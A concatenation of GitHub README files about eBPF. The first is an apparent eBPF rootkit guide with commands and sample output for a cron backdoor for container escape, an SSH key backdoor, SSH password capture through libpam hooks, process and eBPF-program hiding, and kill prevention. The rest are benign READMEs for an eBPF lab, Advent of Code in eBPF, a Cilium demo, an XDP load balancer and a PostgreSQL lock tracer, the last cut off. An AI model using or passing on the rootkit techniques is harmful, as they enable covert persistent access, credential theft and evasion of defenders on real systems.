Normal use can create a hard-to-discover cron backdoor that enables container escape in a container environment with `CAP_SYS_ADMIN` privileges.

Looking at the cron process via `strace` reveals that `newfstatat` is called three times to read `/etc/crontab`, the third time with `newfstatat(5, """", {st_mode=S_IFREG|0644, st_size=1136, ...} , AT_EMPTY_PATH) = 0`, so the code also needs to pay attention to the judgement of `dtd`.

```bash
strace -p 1042
strace: Process 1042 attached
restart_syscall(<... resuming interrupted io_setup ...>) = 0
newfstatat(AT_FDCWD, ""/etc/localtime"", {st_mode=S_IFREG|0644, st_size=561, ...}, 0) = 0
newfstatat(AT_FDCWD, ""crontabs"", {st_mode=S_IFDIR|S_ISVTX|0730, st_size=4096, ...}, 0) = 0
newfstatat(AT_FDCWD, ""/etc/crontab"", {st_mode=S_IFREG|0644, st_size=1136, ...}, 0) = 0
newfstatat(AT_FDCWD, ""/etc/cron.d"", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
newfstatat(AT_FDCWD, ""/etc/cron.d/anacron"", {st_mode=S_IFREG|0644, st_size=219, ...}, 0) = 0
newfstatat(AT_FDCWD, ""/etc/cron.d/e2scrub_all"", {st_mode=S_IFREG|0644, st_size=202, ...}, 0) = 0
newfstatat(AT_FDCWD, ""/etc/crontab"", {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_SYMLINK_NOFOLLOW) = 0
openat(AT_FDCWD, ""/etc/crontab"", O_RDONLY) = 5
newfstatat(5, """", {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_EMPTY_PATH) = 0
getpid()                                = 1042
getpid()                                = 1042
sendto(4, ""<78>Jan 14 18:50:01 cron[1042]: ""..., 64, MSG_NOSIGNAL, NULL, 0) = 64
fcntl(5, F_GETFL)                       = 0x20000 (flags O_RDONLY|O_LARGEFILE)
lseek(5, 0, SEEK_CUR)                   = 0
newfstatat(5, """", {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_EMPTY_PATH) = 0
read(5, ""* * * * * root /bin/sh -c \""curl ""..., 4096) = 1136
lseek(5, 0, SEEK_SET)                   = 0
read(5, ""* * * * * root /bin/sh -c \""curl ""..., 4096) = 1136
....
```

By hooking the process in question, it is possible to inject malicious commands into `/etc/crontab` every minute when cron checks it.

The backdoor is targeted at `vixie-cron`, no other version of `cron` has been tested.

## How to Use

```bash
./main --help
Usage of ./main:
  -catchssh string
        catch the ssh username and password or not (default ""-1"")
  -croncmd string
        the cmd that cron will execute.If you want to use quotes, use single quotes
  -dexec string
        directly exec or not (default ""-1"")
  -hideebpf string
        hide or not hide the ebpf prog ,map and link (default ""1"")
  -ifname string
        interface xdp and tc will attach
  -pampath string
        the absolute path of libpam.so.0,maybe need 'find / -name libpam.so.0'
  -pid string
        pid to hide (default ""-1"")
  -selfpubkey string
        the ssh public key file path we generate,such as ./id_rsa.pub
  -targetpubkey string
        the ssh public key path the user we want to login,such as /root/.ssh/authorized_keys


```

### Hide PIDs

by default, the program's own PID is hidden:

```bash
./main -pid 263959,269942
```

### Memory shell

```bash
./main -ifname lo -dexec 1
```

`ifname` specifies the network interface, set `dexec` to 1.If the program encounters issues on tc and is not cleared, you can manually clear it:

```bash
tc qdisc del dev lo clsact
```

Replace 'lo' with your network interface as needed.

### Prevent Kill

 default functionality, for PIDs

```bash
go build -o main && ./main
2024/01/06 19:19:40 current pid:398235
2024/01/06 19:19:40 Waiting for events..

kill -9 398235
bash: kill: (398235) - No such process
```

### Hide eBPF program

hidden by default

```bash
go build -o main && ./main

# All results are empty
bpftool prog list
bpftool map list
bpftool link list
```

### ssh backdoor

```bash
./main -selfpubkey ./id_rsa.pub -targetpubkey /home/parallels/.ssh/authorized_keys


13:24:47 â€º ssh -i ./id_rsa parallels@10.211.55.11
parallels@10.211.55.11's password:

13:26:29 â€º ssh -i ./id_rsa parallels@10.211.55.11
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.5.13-060513-generic aarch64)
```



### catch the username and password of ssh

```bash
find / -name libpam.so.0
./main -catchssh 1 -pampath /usr/lib/aarch64-linux-gnu/libpam.so.0
2024/01/12 13:39:23 current pid:97335
2024/01/12 13:39:24 Waiting for events..
2024/01/12 13:39:28 =================================================================
2024/01/12 13:39:28 [+]receive SSH Username:feng
2024/01/12 13:39:28 [+]receive SSH Password:qweqweqeqweqw
2024/01/12 13:39:28 =================================================================



```

```bash
13:39:07 â€º ssh feng@10.211.55.11
feng@10.211.55.11's password:
Permission denied, please try again.
```

### cron backdoor

Use single quotes if you want to put quotes in the executed command.

```bash
 ./main -croncmd ""curl http://127.0.0.1:39123/""
2024/01/14 18:55:38 current pid:295190
2024/01/14 18:55:39 Waiting for events..


python3 -m http.server 39123
Serving HTTP on 0.0.0.0 port 39123 (http://0.0.0.0:39123/) ...
127.0.0.1 - - [14/Jan/2024 18:56:01] ""GET / HTTP/1.1"" 200 -
```







The current program only provides simple functionality, so after starting the program, press `ctrl+c` to stop it.

The program uses newer features like `BPF_MAP_TYPE_RINGBUF`. I didn't check the minimum version requirements in detail, but according to GPT, it's roughly Kernel 5.8 and above.

So, it should work on Linux kernels version 5.8 and above. **Additionally, the program needs to be run with root privileges.**

The executable is cross-compiled with Go, theoretically executable on other architectures? This is my kernel version:

```bash

uname -a
Linux ubuntu-linux-22-04-02-desktop 6.5.13-060513-generic #202311281736 SMP PREEMPT_DYNAMIC Tue Nov 28 18:10:14 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux
```

## Manual Compilation

**The compilation process below may have some issues, prioritize building according to the compilation process in `.github/workflows/go.yml` (github actions).**

Due to the use of architecture-specific macros in the code, users need to compile it themselves according to the architecture they are using.

The compilation environment needs to be set up according to [Getting Started - ebpf-go Documentation](https://ebpf-go.dev/guides/getting-started/), as Go is used in the user space. Additionally, the basic environment for compiling eBPF needs to be installed.

It is best to follow the instructions in the article for installation. I will only mention some steps below, and there might be omissions.

Firstly, for the basic eBPF compilation environment, you need to install clang, preferably bet"
chadell/ebpf-playground,7,1,7,0,HCL,,2023-12-06T10:08:31Z,2025-01-07T16:32:06Z,5,"# ebpf-playground

Slides available at [ebpf101.pdf](ebpf101.pdf).

## Lab environment

There is a Terraform plan ready to deploy in Digital Ocean within the `lab` folder.

```bash
$ cd lab/
$ terraform init
$ terraform apply

```

It installs an Ubuntu server 22.04, with some extra packages to allow compiling C code, BFP helpers, etc. You can check them in `lab/servers.tf`.

## BCC hello.py example

This program simply attaches to the `execvd()` syscall and outputs a string.

### Install BCC library

Instructions: https://github.com/iovisor/bcc

```bash
sudo apt-get install bpfcc-tools linux-headers-$(uname -r)
```

### Run it

```py
root@ebpf-lab-1:~/ebpf-playground/examples/python# python3 hello.py
... some warnings ...

b'           <...>-56207   [001] d...1 83066.403493: bpf_trace_printk: Hello NetBCN!'
b'              sh-56208   [001] d...1 83066.405217: bpf_trace_printk: Hello NetBCN!'
b'            node-56209   [001] d...1 83066.408074: bpf_trace_printk: Hello NetBCN!'
```

> Stop it with ctrl+C

Here, as soon as the eBPF program is loaded, you get every executable that uses the `execvd()` syscall.

Aside from the `Hello NetBCN!` string, you get also context info for the process ID, and the command running. For instance, process ID 56208 and command `sh`.

## BCC ping.py example

This program is attached to the XDP hook in the loopback interface `lo`, and counts the packets received.

### Run it

In the terminal, start the `ping.py`:

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/python# python3 ping.py
... some warnings ...
```

At this point, nothing happens, because no packets are directed to the loopback.

In a second terminal, you ping the loopback IP address:

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/python# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
^C
--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 0.044/0.047/0.050/0.003 ms
```

If you check the first terminal you will notice the packets received.

```bash
b'            ping-56396   [001] d.s11 83468.169646: bpf_trace_printk: Got ping packet'
b'            ping-56396   [001] d.s11 83469.174448: bpf_trace_printk: Got ping packet'
```

As an experiment, you can change the XDP code in the `ping.py`, from `XDP_PASS` to XDP_DROP.

```c
  if (is_icmp_ping_request(data, data_end)) {
        bpf_trace_printk(""Got an ICMP packet"");
        return XDP_DROP;
  }
```

Now, if you repeat the test, you will see how the ICMP packets are not returned (because are dropped):

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/python# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
^C
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2036ms

```

## C example

### Install `libbpf`

```bash

root@ebpf-lab-1:/tmp# git clone git@github.com:libbpf/libbpf.git
root@ebpf-lab-1:/tmp# cd libbpf/
root@ebpf-lab-1:/tmp/libbpf# git reset --hard a6d7530cb7dff87ac1e64a540e63b67ddde2e0f9
HEAD is now at a6d7530 Makefile: bump version to v1.0.1
root@ebpf-lab-1:/tmp/libbpf# cd src/
root@ebpf-lab-1:/tmp/libbpf/src# make install
```

### Compile program

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# clang -target bpf -I /usr/include/x86_64-linux-gnu -g -O2 -o hello.bpf.o -c hello.bpf.c

```

### Check the compiled object

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# file hello.bpf.o
hello.bpf.o: ELF 64-bit LSB relocatable, eBPF, version 1 (SYSV), with debug_info, not stripped
```

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# llvm-objdump -S hello.bpf.o

hello.bpf.o: file format elf64-bpf

Disassembly of section xdp:

0000000000000000 <hello>:
; bpf*printk(""Packet received %d"", counter);
0: 18 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 r6 = 0 ll
2: 61 63 00 00 00 00 00 00 r3 = *(u32 _)(r6 + 0)
3: 18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 r1 = 0 ll
5: b7 02 00 00 0f 00 00 00 r2 = 15
6: 85 00 00 00 06 00 00 00 call 6
; counter++;
7: 61 61 00 00 00 00 00 00 r1 = _(u32 _)(r6 + 0)
8: 07 01 00 00 01 00 00 00 r1 += 1
9: 63 16 00 00 00 00 00 00 _(u32 \_)(r6 + 0) = r1
; return XDP_PASS;
10: b7 00 00 00 02 00 00 00 r0 = 2
11: 95 00 00 00 00 00 00 00 exit
```

## Meet your BPF friend: `bpftool`

### Install bpftool

```bash
git clone --recurse-submodules https://github.com/libbpf/bpftool.git
cd bpftool/src
make install
```

## Load the eBPF code

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool prog load hello.bpf.o /sys/fs/bpf/hello
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool prog list
...
147: xdp name hello tag d35b94b4c0c10efb gpl
loaded_at 2023-12-07T13:39:08+0000 uid 0
xlated 96B jited 64B memlock 4096B map_ids 3,4
btf_id 64
```

### Check the XDP program loaded

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool prog show id 147 --pretty
{
""id"": 147,
""type"": ""xdp"",
""name"": ""hello"",
""tag"": ""d35b94b4c0c10efb"",
""gpl_compatible"": true,
""loaded_at"": 1701956348,
""uid"": 0,
""bytes_xlated"": 96,
""jited"": true,
""bytes_jited"": 64,
""bytes_memlock"": 4096,
""map_ids"": [3,4
],
""btf_id"": 64
}
```

### Attach to the loopback

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool net attach xdp id 147 dev lo
```

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool net list
xdp:
lo(1) generic id 147

tc:

flow_dissector:

netfilter:
```

```bash


root@ebpf-lab-1:~/ebpf-playground/examples/c# ip link
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 xdpgeneric qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
prog/xdp id 147 tag d35b94b4c0c10efb jited
...
```

### Check what's going on

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# cat /sys/kernel/debug/tracing/trace_pipe
sshd-13707 [000] d.s11 7517.712510: bpf_trace_printk: Packet Received 2222
...
```

### BFP Maps

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool map list
3: array name hello.bss flags 0x400
key 4B value 4B max_entries 1 memlock 4096B
btf_id 64
4: array name hello.rodata flags 0x80
key 4B value 15B max_entries 1 memlock 4096B
btf_id 64 frozen
16: array name pid_iter.rodata flags 0x480
key 4B value 4B max_entries 1 memlock 4096B
btf_id 82 frozen
pids bpftool(17487)
17: array name libbpf_det_bind flags 0x0
key 4B value 32B max_entries 1 memlock 4096B
```

```json
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool map dump name hello.bss
[{
        ""value"": {
            "".bss"": [{
                    ""counter"": 703
                }
            ]
        }
    }
]
```

### Detaching the program

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool net detach xdp dev lo
```

### Unload the program

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# rm /sys/fs/bpf/hello
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool prog show name hello
```

### Let's try to make the Verifier unhappy

Comment out the LICENSE, compile again, and try to load the eBPF

```bash
root@ebpf-lab-1:~/ebpf-playground/examples/c# bpftool prog load hello.bpf.o /sys/fs/bpf/hello
libbpf: prog 'hello': BPF program load failed: Invalid argument
libbpf: prog 'hello': -- BEGIN PROG LOAD LOG --
; bpf_printk(""Packet received %d"", counter);
0: (18) r6 = 0xffff948300218000
2: (61) r3 = *(u32 *)(r6 +0)
 R1=ctx(id=0,off=0,imm=0) R6_w=map_value(id=0,off=0,ks=4,vs=4,imm=0) R10=fp0
3: (18) r1 = 0xffff88d7340bdd10
5: (b7) r2 = 19
6: (85) call bpf_trace_printk#6
cannot call GPL-restricted function from non-GPL compatible program
processed 5 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0
-- END PROG LOAD LOG --
libbpf: prog 'hello': failed to load: -22
libbpf: failed to load object 'hello.bpf.o'
Error: failed to load object file
```

## References

https://github.com/lizrice/learning-ebpf
https://prathyushpv.github.io/2019/05/20/Building_usefull_tools_with_eBPF_Part1_Setting_up_bcc.html
https://gist.github.com/satrobit/17eb0ddd4e122425d96f60f45def9627
https://speakerdeck.com/fedepaol/ebpf-for-the-rest-of-us-golab-2023?slide=120
"
lizrice/ebpf-advent,46,0,46,0,C,Advent of code in eBPF,2023-12-24T16:49:30Z,2025-09-13T12:29:20Z,13,"# Advent of Code 2023 Day1

My challenge to myself: implement the Advent of Code challenges entirely in
eBPF. Having done these challenges before I know the input is essentially a
file. I want to simply be able to `cat` the input file, and have eBPF tell me
the answer. None of the problem-solving logic is to be in user space - all I'm
allowing myself to do in user space is load the BPF programs, initialize and 
load maps, and output the results. 

I've used a kernel v6.5.0 as supplied in Ubuntu 23.10

## Install & set up environment 

Similar to [learning-ebpf](https://github.com/lizrice/learning-ebpf) examples: 

```
# Clone the repo
git clone --recurse-submodules https://github.com/lizrice/ebpf-advent
cd ebpf-advent

# Start a Lima VM
limactl start advent-ebpf.yaml

# You might want multiple shells. For each, just run
limactl shell advent-ebpf

# You'll need to be root 
sudo -s

# Install libbpf
cd libbpf/src
make install 
cd ../..
```

## Building and running the code

Run any of `make p1`, `make p2` or `make p2a` to get an executable called
`day1`. Run this (as root) in one terminal and in another run 
`cat advent.example` or `cat advent.full`. You could also use a third terminal
to run `bpftool prog trace` to see tracing / debugging output.

## Filtering interesting events

The kprobe attached to vfs_open() lets us ignore files that we're not interested
in, being read by any other executables. 

In the kprobe attached to vfs_read() we can get the address of the buffer that
data will be read into, but it won't be populated at that point. Parsing the
contents of the buffer is triggered by the kretprobe for vfs_read(). 

## File parsing

`cat` reads into a 128k buffer. In this challenge (at least for the puzzle input 
I was given) the input file is 21760 bytes long. I copied the buffer memory section by section 
into a local buffer size ADVENT_BUFFER_LEN. Since this buffer lives on the stack it
can't be arbitrarily large (in fact I had to adjust the size for the different
`examine_char` implementations.) By using a combination of loops and recursively calling 
the tail call `buffer_read` I've been able to parse enough characters to solve this challenge. 

## Day 1 Part 1

The challenge here is to find the first and last digits in each line,
combine those into a two-digit number and then add up all these numbers. The
code is in day1p1.bpf.c.

Lines could very easily be split across the arbitrary ADVENT_BUFFER_LEN
boundary.

## Day 1 Part 2

In part 2, you also have to account for digits that might be spelled out as
words (for example `two`, instead of `2`).

There are two solutions here in `day1p2.bpf.c` and `day1p2a.bpf.c`.

The first is the straightforward way. The second version uses an FSM to parse the digits. This uses less stack 
space, so I can use a larger size for ADVENT_BUFFER_LEN (which would allow for parsing a bigger 
file if necessary).

---
If you want to learn more about eBPF, you might want to check out my repo and book [Learning eBPF](https://github.com/lizrice/learning-ebpf)
"
Smana/cilium-gateway-api,17,3,17,10,HCL,Demo of how Gateway API can be used with Cilium,2023-07-30T19:33:19Z,2025-09-19T13:43:28Z,124,"# cilium-gateway-api

The main purpose of this repository is to demonstrate how [**Cilium**](https://cilium.io/) implements the â˜¸ [**Gateway-API**](https://gateway-api.sigs.k8s.io/) standard. [**Here**](https://blog.ogenki.io/) is the related blog post.

âš ï¸âš ï¸ **Deprecated please refer to the [Cloud Native Reference](https://github.com/Smana/demo-cloud-native-ref) repo for an up to date example** âš ï¸âš ï¸

![overview](.assets/cilium-gateway-api.png)

This repository also is a reference for configuring a platform with the following key points:

* An EKS cluster deployed using Terraform ([here](./terraform/eks/README.md) for details)
* Cilium is installed as the drop-in replacement of the AWS CNI in kube-proxy less mode AND using a distinct daemonSet for Envoy (L7 loadbalancing)
* Everything is deployed the GitOps way using Flux
* Crossplane is used to configure IAM permissions required by the platform components
* Manage DNS records automatically using External-DNS
* Manage secrets from AWS secrets manager using External-Secrets

## ðŸ”„ Dependencies matter

```mermaid
graph TD;
    Namespaces-->CRDs;
    CRDs-->Observability;
    CRDs-->Security;
    CRDs-->Infrastructure;
    Crossplane-->Infrastructure;
    Crossplane-->Security;
    Observability-->Apps;
    Infrastructure-->Apps;
    Security-->Apps;
    Security-->Observability;
    Security-->Infrastructure
```

This diagram can be hard to understand so these are the key information:

* **Namespaces** are the first resources to be created, all other resources may be namespace scoped
* **CRDs** that allow to extend Kubernetes capabilities must be present in order to use them in all other applications when needed.
* **Crossplane** creates [IRSA](https://docs.aws.amazon.com/emr/latest/EMR-on-EKS-DevelopmentGuide/setting-up-enable-IAM.html) permissions which are required by some components
* **Security** defines `external-secrets` that are needed by some applications in order to start. Furthermore there may be `kyverno` mutating policies that must be there before the resources they are targeting.

## âš™ï¸ Flux variables substitutions

Variables substitions is a very powerful [Flux](https://fluxcd.io/)'s feature that allows to reduce at its bare minimum code deduplication.

This has been covered in this [previous article](https://blog.ogenki.io/post/terraform-controller/#variable-substitution).

## â“ How is Crossplane used

Basically [Crossplane](https://www.crossplane.io/) allows to provision and manage Cloud Infrastructure (and even more) using the native Kubernetes features.

It needs to be installed and set up in three **successive steps**:

1. Installation of the Kubernetes operator
2. Deployment of the AWS provider, which provides custom resources, including AWS roles, policies, etc.
3. Installation of compositions that will generate AWS resources.

There is a unique composition here: `irsa` that allows to provide fine-grained permissions to a few Kubernetes operators.

âš ï¸ This repository sets up a central EKS management cluster, and there are some **security considerations** to be aware of, particularly concerning AWS permissions. Specifically, `Crossplane` is able to manage (and even create) IAM roles with the prefix `xplane-`. Thus, if it's compromised, there's a potential to create a role with full admin privileges.

### IRSA example with external-dns

I utilize a [Compostion](https://docs.crossplane.io/v1.13/concepts/compositions/) provided by [Upbound](https://www.upbound.io/) (the company behind Crossplane) available [here](https://github.com/upbound/platform-ref-aws/tree/main/package/cluster/irsa). I've made minor adjustments to ensure that it works fine with the Terraform/Flux bootstrapping approach used in this repository.

Here's is how to use the composition:

```yaml
apiVersion: aws.platformref.upbound.io/v1alpha1
kind: IRSA
metadata:
    name: xplane-external-dns-${cluster_name}
spec:
    deletionPolicy: Delete
    parameters:
        condition: StringEquals
        # Reference: https://kubernetes-sigs.github.io/external-dns/v0.13.4/tutorials/aws/#iam-policy
        policyDocument: |
            {
                ""Version"": ""2012-10-17"",
                ""Statement"": [
                    {
                        ""Effect"": ""Allow"",
                        ""Action"": [
                            ""route53:ChangeResourceRecordSets""
                        ],
                        ""Resource"": [
                            ""arn:aws:route53:::hostedzone/*""
                        ]
                    },
                    {
                        ""Effect"": ""Allow"",
                        ""Action"": [
                            ""route53:ListHostedZones"",
                            ""route53:ListResourceRecordSets""
                        ],
                        ""Resource"": [
                            ""*""
                        ]
                    }
                ]
            }

        serviceAccount:
            name: external-dns
            namespace: kube-system
```

This is pretty straightforward! We define the policy and the serviceAccount to which it has to be associated then we have to wait a few seconds until the claims are ready and synced.

â„¹ï¸ Under the hood each IRSA resource creates 3 things: A role, a rolePolicy and a rolePolicyAttachment.

```console
kubectl get irsa --all-namespaces
NAMESPACE     NAME                                         SYNCED   READY   CONNECTION-SECRET   AGE
kube-system   xplane-external-dns-mycluster-0              True     True                        30m
kube-system   xplane-loadbalancer-controller-mycluster-0   True     True                        30m
security      xplane-cert-manager-mycluster-0              True     True                        32m
security      xplane-external-secrets-mycluster-0          True     True                        32m
```

## CI

2 things are checked

* The terraform code quality, conformance and security using [pre-commit-terraform](https://github.com/antonbabenko/pre-commit-terraform).
* The kustomize and Kubernetes conformance using kubeconform and building the kustomize configuration.

In order to run the CI checks locally just run the following command

â„¹ï¸ It requires [task](https://taskfile.dev/installation/) to be installed

```console
 task check
```

The same tasks are run in `Github Actions`.
"
snpsuen/XDP_LBDSR_Enhance,6,3,6,0,C,,2023-12-10T15:01:52Z,2024-01-08T17:08:36Z,134,"## eBPF/XDP-based Load Balancer Enhancement

A control plane is added to an load balancer that was created earlier to dispatch workloads through direct server return in an eBPF/XDP framework [(see here)](https://github.com/snpsuen/XDP_DSR_Load_Balancer). Instead of hardcording the configuation, user-defined bpf maps are applied together with a ring buffer to manage the backend servers, load balancer, track the dispatch activities and others. 

The load balancer is implemented by a bpf program running in the kernel space to redirect the network traffic on the data plane under the control of a user-space program.
* xdp_lbdsr.bpf.c (Data plane in the kernel space)
* xdp_lbdsr.c (Control plane in the user space)

![Load Balancer Architecture Based on eBPF/XDP](images/XDP_DSR_LoadBalancer01_p2.png)

### Use Case Example

The load balancer is tyically used for the so-called one-armed deployment, whereby it is attached via a single NIC to the same IP subnet as the client and backend servers. When the client issues a request for a service exposed from a virtual IP, the incoming traffic is routed by the load balancer to one of the backend servers in a random manner. Subsequent replies from the chosen backend server are returned directly to the client.

It is worthwhile to note that only the MAC addresses of network packets are required to change in the process. There is no need to modify any parts of the L3 headers and beyond all along.

![Delivery Of Workloads Through Direct Server Return](images/XDP_DSR_LoadBalancer01_p1.png)

### Setup and Experimentation

A testbed of docker containers is set up for experimentation with the use case example. The steps are pretty much the same as those of the [earlier repo](https://github.com/snpsuen/XDP_DSR_Load_Balancer) You may choose a Linux VM or a [Killercoda Ubuntu Playground] (https://killercoda.com/playgrounds/scenario/ubuntu) to start with as a host of the following containers.
* Load balancer: lbdsr01
* Backend Server A: backend-A
* Backend Server B: backend-B
* Curl client: curlclient01

#### 1  Build the load balancer
The load balancer is to be built on a Ubuntu container that is equipped with a full ePBF/XDP development environment.
1. Pull a pre-built eBPF/XDP ready docker to run a container as the platform of the load balancer.
```
docker run -d --privileged --name lbdsr0a -h lbdsr0a snpsuen/ebpf-xdp:v03
docker exec -it lbdsr0a bash
```
2. Download this repo and build the load balancer on both the control and data planes.
```
git clone https://github.com/snpsuen/XDP_LBDSR_Enhance
cd XDP*
make
```
3. Open a terminal to the host of the container and prepare for the on-going bpf_printk messages to be traced in real time.
```
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

#### 2  Set up backend servers
1. Run a pair of backend servers on the nginx hello docker.
```
docker run -d --privileged --name backend-A -h backend-A nginxdemos/hello:plain-text
docker run -d --privileged --name backend-B -h backend-B nginxdemos/hello:plain-text
```
2. Login to each backend containers and assign a given virtual IP (VIP) as an alias address to the loopback interface.
```
docker exec -it backend-A sh
ip addr add 192.168.25.10/24 dev lo
```
Similar steps are taken on the backend-B container.

In this case, the VIP is set arbitraily to 192.168.10.25, which is totally separate from the physical address space of the testbed, 172.17.0.0/24. It will be used by clients to access the requested service through the load balancer.

#### 3  Set up a client container
1. Run a client container based on the latest curl docker.
```
docker run -d --privileged --name curlclient -h curlclient curlimages/curl:latest sleep infinity
```
2. Add a host route to the the VIP 192.168.10.25/32 via the load balancer at 172.17.0.2.
```
docker exec -it -u root curlclient sh
ip route add 192.168.25.10/32 via 172.17.0.2
```
More realistically, say in a production environment, it is necessary to arrange for the VIP host route to be originated as a stub link for advertisement by routing protocols like OSPF and BGP throughout an autonmous system and beyond.

#### 4  Test it out

1. Enter the load balancer container and run the control plane ./xdp_lbdsr where the attached NIC and ring buffer poll interval are set to eth0 and 1000 ms respectively.
```
docker exec -it lbdsr0a bash
cd XDP_LBDSR*
./xdp_lbdsr
```
![demo_screen01](images/xdp_lbdsr_screen01.PNG)

2. Select option 2 from the main menu to specify the VIP together with the MAC of the load balancer.

![demo_screen02](images/xdp_lbdsr_screen02.PNG)

3. Select option 2 from the main menu, followed by 1 from the submenu to register the backend servers backend-A and backend-B.

![demo_screen03](images/xdp_lbdsr_screen03.PNG)

4. Enter the curl client container and access the backend nginx servers through the VIP in a loop. The http requests are observed to be dispatched randomly between backend-A and backend-B.

![demo_screen05](images/xdp_lbdsr_screen05.PNG)
"
jnidzwetzki/pg-lock-tracer,153,18,153,0,Python,A eBPF based lock tracer for the PostgreSQL database,2022-12-28T11:38:41Z,2025-10-06T19:17:42Z,361,"# Lock tracing tools for PostgreSQL
[![Make a PR](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
[![Build Status](https://github.com/jnidzwetzki/pg-lock-tracer/actions/workflows/tests.yml/badge.svg)](https://github.com/jnidzwetzki/pg-lock-tracer/actions/workflows/tests.yml)
[![PyPI](https://img.shields.io/pypi/v/pg-lock-tracer?color=green)](https://pypi.org/project/pg-lock-tracer/)
[![PyPI - Downloads](https://img.shields.io/pypi/dm/pg-lock-tracer)](https://pypi.org/project/pg-lock-tracer/)
[![Release date](https://img.shields.io/github/release-date/jnidzwetzki/pg-lock-tracer)](https://github.com/jnidzwetzki/pg-lock-tracer/)
[![GitHub Repo stars](https://img.shields.io/github/stars/jnidzwetzki/pg-lock-tracer?style=social)](https://github.com/jnidzwetzki/pg-lock-tracer/)

This project provides tools that allow you to gain deep insights into PostgreSQL's locking activities and troubleshoot locking-related issues (e.g., performance problems or deadlocks).

* `pg_lock_tracer` - is a PostgreSQL table level lock tracer.
* `pg_lw_lock_tracer` - is a tracer for PostgreSQL lightweight locks (LWLocks).
* `pg_row_lock_tracer` - is a tracer for PostgreSQL row locks.
* `animate_lock_graph` - creates animated locks graphs based on the `pg_lock_tracer` output.

__Note:__ These tools employ the [eBPF](https://ebpf.io/) (_Extended Berkeley Packet Filter_) technology. At the moment, PostgreSQL 12, 13, 14, 15, and 16 are supported (see additional information below).

# pg_lock_tracer
`pg_lock_tracer` observes the locking activity of a running PostgreSQL process (using _eBPF_ and _UProbes_). In contrast to the information that is present in the table `pg_locks` (which provides information about which locks are _currently_ requested), `pg_lock_tracer` gives you a continuous view of the locking activity and collects statistics and timings.

The tracer also allows dumping the output as JSON formatted lines, which allows further processing with additional tools. This repository also contains the script `animate_lock_graph`, which provides an animated version of the taken looks.

## Usage Examples
```
# Trace use binary '/home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres' for tracing
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres

# Trace use binary '/home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres' for tracing and trace pid 1234
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234

# Trace two PIDs
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -p 5678

# Be verbose
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -v 

# Use the given db connection to access the catalog of PID 1234 to resolve OIDs
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -r 1234:psql://jan@localhost/test2

# Output in JSON format
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -j

# Print stacktrace on deadlock
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -s DEADLOCK

# Print stacktrace for locks and deadlocks
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -s LOCK DEADLOCK

# Trace only Transaction and Query related events
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -t TRANSACTION QUERY

# Write the output into file 'trace'
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -o trace

# Show statistics about locks
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 --statistics

# Create an animated lock graph (with Oids)
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -j -o locks.json
animate_lock_graph -i lock -o locks.html

# Create an animated lock graph (with table names)
pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_15_1_DEBUG/bin/postgres -p 1234 -j -r 1234:psql://jan@localhost/test2 -o locks.json
